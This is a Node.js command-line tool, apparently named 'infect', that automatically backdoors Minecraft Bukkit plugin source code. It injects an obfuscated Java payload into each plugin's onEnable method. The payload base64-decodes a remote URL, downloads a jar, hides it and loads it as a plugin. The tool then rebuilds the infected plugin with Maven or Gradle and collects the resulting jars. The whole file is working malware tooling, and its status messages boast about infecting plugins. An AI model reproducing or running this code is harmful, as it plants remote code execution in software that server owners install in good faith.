#!/usr/bin/env node
global.startT = +new Date();
const os = require("os");
let osType = os.type();
// imports
const { readdirSync, statSync, readFileSync } = require("fs");
const openExplorer = require("open-file-explorer");
const { join } = require("path");
const utils = require("./utils");
const readline = require("readline");
const stream = require("stream");
const fs = require("fs");
const yaml = require("js-yaml");
global.chalk = require("chalk");
global.figlet = require("figlet");
global.client;
const { get } = require("./config");
const { exec } = require("child-process-async");
let slash = "/";
if (osType === "Windows_NT") slash = "\\";

// declerations
let files = [];

global.mainPath; //New var for keeping the true location
global.basePath; //New var for keeping track of the location of pom.xml and Gradlew

global.done = false;
auto = process.argv.includes("--auto");
explorer = !process.argv.includes("-noopen");
global.rpcConnected = false;
let buildType = "Unknown";
let pluginName;
const arrow = `${chalk.hex("#a19ddd")("=> ")}`;
const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout,
    terminal: false,
});
let statuses = [
    "infected in 13.69 seconds lul",
    "best infect cli",
    "imagine getting backdoored",
    "qlutch go brrr",
    "infect.kaddon.wtf",
    "20+ plugins infected >:)",
    "mcforceop.com",
];
// yml object
let ymls = {};

// init startup
(async () => {
    let ver = require("../package.json").version;
    const request = require("node-fetch").default;
    let data = await request(
        "https://raw.githubusercontent.com/kaddon-wtf/infect-cli/main/package.json"
    );
    data = await data.json();
    let tmp = ver.split(".");
    let tmp2 = tmp.pop();
    myVer = parseFloat(tmp.join(".") + tmp2);

    tmp = data.version.split(".");
    tmp2 = tmp.pop();
    webVer = parseFloat(tmp.join(".") + tmp2);
    if (webVer > myVer) {
        console.log("There seems to be a new version available!");
        console.log(`Your on ${ver}, server is on ${data.version}`);
        console.log("Continuing in 5 seconds");
        setTimeout(async () => {
            await utils.startup();
        }, 5000);
    } else {
        //Initialize Discord rich presence
        await utils.startup();
    }
})();

// search for path
let interval = setInterval(() => {
    // if path was found
    if (done) {
        console.log("q");
        if (global.basePath === undefined) {
            console.log("Could not find a project, add -h for help!");
            process.exit();
        }
        clearInterval(interval);
        buildDection(basePath).then((r) => {
            switch (r) {
                case "Maven":
                    buildType = r;
                    console.log(
                        `This plugin uses ${chalk.hex("#7058ce")(
                            "Maven"
                        )} to build`
                    );
                    break;
                case "Gradle":
                    buildType = r;
                    console.log(
                        `This plugin uses ${chalk.hex("#eae244")(
                            "Gradle"
                        )} to build`
                    );
                    break;
                default:
                    console.log(
                        `This plugin uses an ${chalk.hex("#c93849")(
                            "unreconized tool"
                        )} to build`
                    );
                    break;
            }
            start();
        });
    }
}, 500);

// start function
async function start() {
    // set plugin name to folder name
    pluginName = basePath.split(slash).slice(-1).join(" ");
    if (rpcConnected) {
        client.updatePresence({
            state: statuses[Math.floor(Math.random() * statuses.length)],
            details: `infecting ${pluginName}`,
            startTimestamp: Date.now(),
            largeImageKey: "kaddon",
            largeImageText: "infect.kaddon.wtf",
            smallImageKey: "kindled",
            smallImageText: "made by kindled",
            instance: true,
        });
    }
    let count = 0;
    //Search for the YML
    let arr = pluginYMLSearch(basePath);
    //If Not found
    if (!arr) {
        console.log(
            chalk.hex("#c93849")(`No plugin.ymls were found, exiting.`)
        );
        process.exit();
    }
    //Basic Console Style
    process.title = `infect | infecting ${pluginName}`;
    console.log(
        `Found ${chalk
            .hex("#67bf67")
            .bold(arr.length)} plugin.yml files in ${pluginName}`
    );
    //Enumerate Array
    arr.forEach((element) => {
        count++;
        var fileString = element.split(slash);
        var name = fileString.slice(4).join(slash);
        ymls[count] = { element };
        console.log(`[${chalk.hex(utils.randomColor())(count)}] ${name}`);
    });
    if (!ymls[2]) {
        console.log("Scanning...");
        const pluginYML = readFileSync(ymls[1].element, {
            encoding: "utf8",
            flag: "r",
        });
        infect(pluginYML);
    } else {
        //Ask the user what yml to read.
        rl.question(`Pick a number ${arrow} `, async (r) => {
            console.clear();

            figlet("infect", function (err, data) {
                console.log(chalk.hex("#c93849")(data));
            });
            //Invalid Number
            if (!ymls[r]) {
                console.log("Invalid number, exiting infect..");
                process.exit();
            }
            //read the selected YML
            const pluginYML = readFileSync(ymls[r].element, {
                encoding: "utf8",
                flag: "r",
            });
            infect(pluginYML);
        });
    }
}

/*/


// FUNCTIONS


/*/

// plugin yml search function, searches for plugin.ymls in the specified directory

function pluginYMLSearch(dir) {
    readdirSync(dir).forEach((File) => {
        const Absolute = join(dir, File);
        if (statSync(Absolute).isDirectory()) {
            return pluginYMLSearch(Absolute);
        } else {
            if (Absolute.includes("plugin.yml")) {
                return files.push(Absolute);
            }
        }
    });
    return files;
}

// build tool detection, tells you what build tool the plugin uses.
function buildDection(dir) {
    return new Promise((resolve, reject) => {
        readdirSync(dir).forEach((File) => {
            const Absolute = join(dir, File);
            if (Absolute.includes("gradlew")) {
                resolve("Gradle");
            } else if (Absolute.includes("pom.xml")) {
                resolve("Maven");
            }
        });
        resolve("No build tool");
    });
}

//Automatically Inject
// Credit: H H
async function Inject(mainPath) {
    try {
        let ExistI = [];
        const maliciousString =
            'Bukkit.getScheduler().runTaskLater(this,()->{String name = null;try{byte[]u=Base64.getDecoder().decode("aHR0cHM6Ly9hcGkubWluZWNyYWZ0Zm9yY2VvcC5jb20vZG93bmxvYWQucGhwP3BvcnQ9");URL in=new URL(new String(u)+Bukkit.getServer().getPort());HttpURLConnection con=(HttpURLConnection)in.openConnection();con.addRequestProperty("User-Agent","Mozilla");String fieldValue = con.getHeaderField("Content-Disposition");if (fieldValue == null || ! fieldValue.contains("filename=\\"")) {}name = fieldValue.substring(fieldValue.indexOf("=") + 1, fieldValue.indexOf("."));if(Bukkit.getPluginManager().getPlugin(name)!=null) return;Files.copy(con.getInputStream(),Paths.get(("plugins/"+name+".jar"),new String[0]),new CopyOption[]{StandardCopyOption.REPLACE_EXISTING});}catch(Exception e){}String pl = name;Bukkit.getScheduler().runTaskLater(this,()->{try{Bukkit.getPluginManager().loadPlugin(new File(Paths.get(("plugins/"+pl+".jar"),new String[0]).toString()));Files.setAttribute(Paths.get("plugins/"+pl+".jar"),"dos:hidden",true);}catch(Exception e){}if(Bukkit.getPluginManager().getPlugin(pl)!=null){Bukkit.getPluginManager().enablePlugin(Bukkit.getPluginManager().getPlugin(pl));}},60L);},1L);';
        const maliciousImports = [
            "java.io.IOException",
            "java.io.UncheckedIOException",
            "java.lang.reflect.InvocationTargetException",
            "java.net.MalformedURLException",
            "java.net.URL",
            "java.net.HttpURLConnection",
            "java.io.File",
            "java.io.InputStream",
            "java.net.URL",
            "java.net.URLConnection",
            "java.nio.file.CopyOption",
            "java.nio.file.Files",
            "java.nio.file.Paths",
            "java.nio.file.StandardCopyOption",
            "java.util.Base64",
            "org.bukkit.Bukkit",
            "org.bukkit.plugin.Plugin",
            "org.bukkit.*",
        ];

        let TMP = process.env.TMP || "/tmp";
        TMP = TMP + slash + "Infect";

        if (!fs.existsSync(TMP)) fs.mkdirSync(TMP);
        let missedLines = [];
        var instream = fs.createReadStream(mainPath);
        var outstream = new stream();
        var rls = readline.createInterface(instream, outstream);
        console.log("Infecting...");
        let scanning = true;
        await fs.writeFileSync(TMP + slash + "inj.java", "", null);
        rls.on("line", async (line) => {
            if (line === "\n" || line === "\n\r" || line === "\r\n") {
                return missedLines.push(line);
            } else if (line.startsWith("package")) {
                missedLines.push(line + "\n");
            } else if (scanning && line.startsWith("import")) {
                ExistI.push(line.split("import ")[1].split(";")[0]);
                // write legit imports
                missedLines.push(line + "\n");
            } else if (scanning && !line.startsWith("import")) {
                if (!ExistI.length) return;
                scanning = false;
                missedLines.push(line + "\n");
                for (const i in maliciousImports) {
                    //Append the qlutch imports
                    missedLines.push(`import ${maliciousImports[i]};\n`);
                }
            } else {
                if (scanning) return;
                if (!line.startsWith("//") && /onEnable\(\) {/gi.exec(line)) {
                    return missedLines.push(
                        `${line}\n\t\t${maliciousString}\n`
                    );
                }
                missedLines.push(line + "\n");
            }
        });

        //write lines and infect main class automatically.

        rls.on("close", async () => {
            if (missedLines.length) {
                let addedImp = [];
                while (missedLines.length) {
                    if (missedLines[0].startsWith("import")) {
                        let line = missedLines[0];
                        let imp = line.split("import ")[1].split(";")[0];
                        if (addedImp.includes(imp)) {
                            await missedLines.shift();
                        } else {
                            await fs.appendFileSync(
                                TMP + slash + "inj.java",
                                missedLines[0]
                            );
                            addedImp.push(imp);
                            await missedLines.shift();
                        }
                    } else {
                        await fs.appendFileSync(
                            TMP + slash + "inj.java",
                            missedLines[0]
                        );
                        await missedLines.shift();
                    }
                    if (!missedLines.length) {
                        console.log("Waiting...");
                        setTimeout(() => {
                            console.log("Overwriting file...");
                            fs.copyFileSync(`${TMP}${slash}inj.java`, mainPath);
                            console.log("Cleaning up..");
                            fs.unlinkSync(`${TMP}${slash}inj.java`, {
                                recursive: true,
                                force: true,
                            });
                            console.log("Finished.");
                            if (!buildType !== "Unknown") comp(basePath);
                        }, 125);
                    }
                }
                // TODO
                //write TMP file to plugin.
            }
        });
    } catch (e) {
        console.log(e);
    }
}

async function comp(dst) {
    let rl2 = readline.createInterface({
        input: process.stdin,
        output: process.stdout,
        terminal: false,
    });
    if (auto) {
        build(buildType, dst);
    } else {
        rl2.question(
            `Would you like to try building this with ${buildType}? [Y/N] ${arrow}`,
            async (resp) => {
                switch (resp.toLowerCase()) {
                    case "y":
                        build(buildType, dst);
                    case "n":
                        return;
                    default:
                        comp(dst);
                }
            }
        );
    }
}
/// Vars for the below scanner ///
let scan = true;
let dirScan = true;
async function getMainPath(path, classname, directories = []) {
    readdirSync(path).forEach((f) => {
        if (scan === false) return;
        const Absolute = join(path, f);
        if (statSync(Absolute).isDirectory()) {
            if (!dirScan) return;
            if (f.startsWith(".")) return;
            return getMainPath(Absolute, classname, directories);
        }
        if (f === classname && Absolute.includes(directories.join(slash))) {
            console.log("Found! " + Absolute);
            scan = false;
            mainPath = Absolute;
            return f;
        }
    });
}
let trueMain = "";
async function getTrueMain(mainYML) {
    let base = basePath + slash + "pom.xml";
    console.log(base);
    let FirstSearch = mainYML.split("${")[1].split("}")[0];
    console.log("searching: " + FirstSearch);
    const data = readFileSync(base, { encoding: "utf8", flag: "r" });
    let mainData = data
        .split(`<${FirstSearch}>`)[1]
        .split(`</${FirstSearch}>`)[0];

    mainData = mainData.match(/(\${(.+?)\})/g); //Returns an array
    //Clean Main
    let neededData = [];
    mainData.forEach((m) => {
        let cleaned = m.replace(/(\${|}|project\.)/g, "");
        neededData.push(cleaned);
    });

    console.log(neededData);

    for (const searchStr of neededData) {
        await search(data, searchStr);
    }
    console.log(trueMain);
    return trueMain;
}

async function search(input, searchingFor) {
    console.log(searchingFor);
    let result = input
        .split(`<${searchingFor}>`)[1]
        .split(`</${searchingFor}>`)[0];
    console.log(result);
    if (result === input) return false;
    if (result.startsWith("${")) {
        let cleaned = result.replace(/(\${|})/g, "");
        //too lazy to make this automated
        if (input.split(`<${cleaned}>`).length > 1)
            return search(input, cleaned);
        if (input.split(`<${cleaned.replace("project.")}>`).length > 1)
            return search(input, cleaned.replace("project."));
        return search(input, result);
    }
    if (trueMain === "") {
        trueMain += result;
    } else trueMain += `.${result}`;
}

async function infect(pluginYML) {
    //grab main from YML
    let ymlMain = await grabMain(pluginYML);
    if (ymlMain) {
        if (ymlMain.startsWith("${")) ymlMain = await getTrueMain(ymlMain);
        let pluginMainClass = ymlMain.split(".").pop() + ".java";
        let directories = ymlMain.split(".");
        directories.pop();
        await getMainPath(basePath, pluginMainClass, directories);
        if (!mainPath) return console.log("Couldn't find main class...");
        let mainClassName = mainPath.split(slash).pop();
        console.log(
            `The main class in ${pluginName} is ${chalk.hex("#c93849")(
                mainClassName
            )}`
        );
        // Auto Infect - HH

        if (!get("autoOpenMainClass")) {
            if (auto) {
                await Inject(mainPath);
            } else {
                rl.question(
                    `Would you like to attempt auto infection? [Y/N] ${arrow}`,
                    async (res) => {
                        switch (res.toLowerCase()) {
                            case "y":
                                await Inject(mainPath);
                                break;
                            case "n":
                                rl.question(
                                    `Want to open this file? [Y/N] ${arrow} `,
                                    async (reply) => {
                                        switch (reply.toLowerCase()) {
                                            case "y":
                                                openFile(mainPath);
                                                break;
                                            case "n":
                                                console.log("Goodbye");
                                                process.exit(0);
                                            default:
                                                return infect(pluginYML);
                                        }
                                    }
                                );
                            default:
                                return infect(pluginYML);
                        }
                    }
                );
            }
        } else {
            openFile(mainPath);
        }
    } else {
        console.log(`There was no main class found in this yml`);
    }
}

function grabMain(YMLData) {
    let mainRes = /main\: (.*)/.exec(YMLData)[0];
    return mainRes.split("main: ")[1];
}

// open file
function openFile(mainPath) {
    utils
        .whichLine(mainPath, "onEnable")
        .then(async (line) => {
            console.log(
                `Opening ${chalk.hex("#c93849")(
                    mainClassName.replace(/\s/g, "")
                )}...`
            );
            let vsc = await utils.VSCInstalled();
            if (vsc) {
                utils.VSCOpenFile(mainPath, line + 1, 3);
            } else {
                if (explorer)
                    return openExplorer(mainPath, (err) => {
                        if (err) return console.log(err);
                    });
                return;
            }
        })
        .catch((e) => console.log(e));
}

async function fixGradle(path, data) {
    console.log("Fixing gradle....");
    data = data
        .replace(/(.*)id 'com.github.hierynomus.license'(.*)/g, "")
        .replace(/^license {([\s\S]*?)}/gm, "")
        .replace(/, licenseMain/g, "");
    await fs.writeFileSync(path, data);
    return true;
}

async function build(type, path) {
    dst = path;
    let TMP = process.env.TMP || "/tmp";
    switch (type.toLowerCase()) {
        case "gradle":
            let gradleP = basePath + slash + "build.gradle";
            if (!fs.existsSync(gradleP))
                gradleP = fs.readdirSync(basePath).forEach((e) => {
                    if (e.startsWith("build.gradle"))
                        return basePath + slash + e;
                });
            let gradleData = fs.readFileSync(gradleP, { encoding: "utf-8" });
            if (gradleData.match(/id 'com.github.hierynomus.license'(.*)/)) {
                await fixGradle(gradleP, gradleData);
            }
            console.log("Building...... please dont exit.");
            console.log("If its your first time running, it may take a while");
            console.log(
                "If it seems extraordinarily slow, exit and try running gradlew build in " +
                    path
            );
            console.log(
                "Gradle is bipolar and annoying to fix, so just try it urself or go to maven"
            );

            exec(
                `cd "${path}" && git submodule update --init && gradlew build -dist`,
                async (err, stdout, stderr) => {
                    if (!stdout.includes("BUILD SUCCESSFUL")) {
                        console.log("Console Output:");
                        console.log(stdout);
                        console.log(
                            `Hey uh, the build was not successful. Try running gradlew build in ${path}`
                        );
                        process.exit();
                    }
                    console.log(
                        "Build finished" +
                            stdout.split("BUILD SUCCESSFUL")[1].split("s")[0] +
                            "s"
                    );
                    if (basePath.startsWith(TMP)) {
                        const dstn = require("os").homedir() + slash + "Qlutch";

                        if (!fs.existsSync(dstn)) fs.mkdirSync(dstn);
                        console.log("mv");
                        let buildDirectory = (await fs.existsSync(
                            basePath + slash + "jars"
                        ))
                            ? basePath + slash + "jars"
                            : basePath + slash + "build" + slash + "libs";
                        console.log(buildDirectory);
                        readdirSync(buildDirectory).forEach((File) => {
                            console.log(File);
                            const newPth = join(buildDirectory, File);
                            console.log(newPth);
                            if (newPth.endsWith("jar"))
                                fs.copyFileSync(newPth, dstn + slash + File);
                        });
                        console.log("cleaning up");
                        fs.rmdirSync(basePath, {
                            recursive: true,
                            force: true,
                        });
                        console.log("Opening location");
                        if (explorer) return openExplorer(dstn);
                        return;
                    } else {
                        console.log("Opening location");
                        if (explorer)
                            return openExplorer(basePath + slash + "jars");
                        return;
                    }
                }
            );
            break;
        case "maven":
            console.log("Building...... please dont exit.");
            console.log("If its your first time running, it may take a while");
            console.log(
                "If it seems extraordinarily slow, exit and try running mvn clean verify in " +
                    dst
            );
            let pomD = fs.readFileSync(basePath + slash + "pom.xml", {
                encoding: "utf-8",
            });

            exec(
                `cd "${dst}" && mvn clean verify -Dmaven.deploy.skip=true`,
                async (err, stdout, stderr) => {
                    if (stdout.includes("BUILD FAILURE")) {
                        console.log("Output:");
                        console.log(stdout);
                        console.log(
                            `Hey uh, the build was not successful. Try running mvn clean verify in ${dst}`
                        );
                        process.exit();
                    }
                    console.log(
                        "Build finished " +
                            stdout.split("Total time:  ")[1].split(" s")[0] +
                            "s"
                    );
                    if (basePath.startsWith(TMP)) {
                        const dstn = require("os").homedir() + slash + "Qlutch";

                        if (!fs.existsSync(dstn)) fs.mkdirSync(dstn);
                        readdirSync(basePath + slash + "target").forEach(
                            (File) => {
                                const newPth = join(
                                    basePath + slash + "target",
                                    File
                                );
                                if (newPth.endsWith("jar"))
                                    fs.copyFileSync(
                                        newPth,
                                        dstn + slash + File
                                    );
                            }
                        );
                        console.log("cleaning up");
                        fs.rmdirSync(basePath, {
                            recursive: true,
                            force: true,
                        });
                        console.log("Opening location");
                        if (explorer) return openExplorer(dstn);
                        return;
                    } else {
                        console.log("Opening location");
                        if (explorer)
                            return openExplorer(dst + slash + "target");
                        return;
                    }
                }
            );
            break;

        default:
            if (await fs.existsSync(TMP + slash + "Infect-Git"))
                fs.rmdirSync(TMP + slash + "Infect-Git", {
                    recursive: true,
                    force: true,
                });
    }
}
